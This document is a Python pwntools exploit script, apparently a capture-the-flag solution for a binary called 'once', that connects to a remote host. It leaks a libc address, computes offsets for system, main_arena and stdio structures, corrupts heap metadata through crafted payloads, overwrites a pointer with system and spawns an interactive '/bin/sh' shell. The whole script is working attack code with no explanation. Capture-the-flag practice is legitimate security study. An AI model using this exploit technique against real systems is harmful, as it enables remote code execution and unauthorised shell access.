from pwn import *

#r = process("./once")
r = remote('47.75.189.102', 9999)

r.recvuntil("> ")
r.sendline('8')
r.recvuntil('choice\n0x')
puts = int(r.recv(12), 16)

libc = puts - 0x6f690
main_arena = libc + 0x3c4b20
addr_top_chunk = main_arena + 0x58
gadget = libc + 0x45216 #rax = 0 

stdout = libc + 0x3c5620
stdin = libc + 0x3c48e0
system = libc + 0x45390

log.info("addr_top_chunk: %#x" %addr_top_chunk)
log.info("gadget: %#x" %gadget)
log.info("main_arena: %#x" %main_arena)
log.info("puts: %#x" %puts)
log.info("libc: %#x" %libc)
log.info("system: %#x" %system)
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = p64(0)
payload += p64(0x2001)
payload += p64(0)
payload += p64(addr_top_chunk-0x10)
r.send(payload)
r.recvuntil("> ")
r.sendline('1')
r.recvuntil("> ")
r.sendline('3')
r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('1')
r.recvuntil('input size:\n')
r.sendline('200')
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = "/bin/sh\x00"
payload += p64(main_arena+0x1c88) 
payload += p64(stdout)
payload += p64(0)
payload += p64(stdin)
payload += p64(0)*2
r.send(payload)
r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = p64(system)
r.send(payload)
r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('3')
r.interactive()